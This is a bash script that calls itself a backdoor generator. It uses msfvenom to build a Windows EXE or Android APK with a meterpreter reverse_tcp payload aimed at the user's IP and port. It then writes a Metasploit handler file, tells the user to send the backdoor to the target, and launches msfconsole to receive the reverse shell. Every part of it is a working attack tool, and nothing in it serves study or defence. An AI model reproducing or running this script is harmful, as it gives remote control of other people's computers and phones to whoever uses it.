#!/bin/bash
#
# This script create a backdoor file.
# This backdoor file enable remote connection
#
# Gabriel Richter <gabrielrih@gmail.com>
#

USE="Usage: $0 [ip] [port] [device]

[Parameters]
ip	Your IP Address
port	Your port conexion
device	Target device [win/android]

Eg: $0 192.168.0.100 3000 win"

if [ $# != 3 ]
then
	echo "$USE"
	exit 1
fi

# Create RC file
if [ ! -f meterpreter.rc ]
then
	touch meterpreter.rc
fi

# Checking device
if [ $3 == 'win' ]
then
	# Set payload in a EXE file
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe > backdoor.exe
	echo "Backdoor.exe file was created"
	
	# Edit meterpreter.rc
	echo "use exploit/multi/handler
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST $1
	set LPORT $2
	run" > meterpreter.rc

elif [ $3 == 'android' ]
then
	# Set payload in a APK file
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R > backdoor.apk
	echo "Backdoor.apk file was created"
	
	# Edit meterpreter.rc
	echo "use exploit/multi/handler
	set PAYLOAD android/meterpreter/reverse_tcp
	set LHOST $1
	set LPORT $2
	run" > meterpreter.rc

else
	echo "ERROR: Please, informe a valid device!"
	echo ""
	echo "$USE"
fi


echo "NOW! YOU MUST SEND THE BACKDOOR FILE TO THE TARGET. THEN PRESS ENTER TO CONTINUE."
read press

# Start metasploit
msfconsole -q -r meterpreter.rc

exit 0
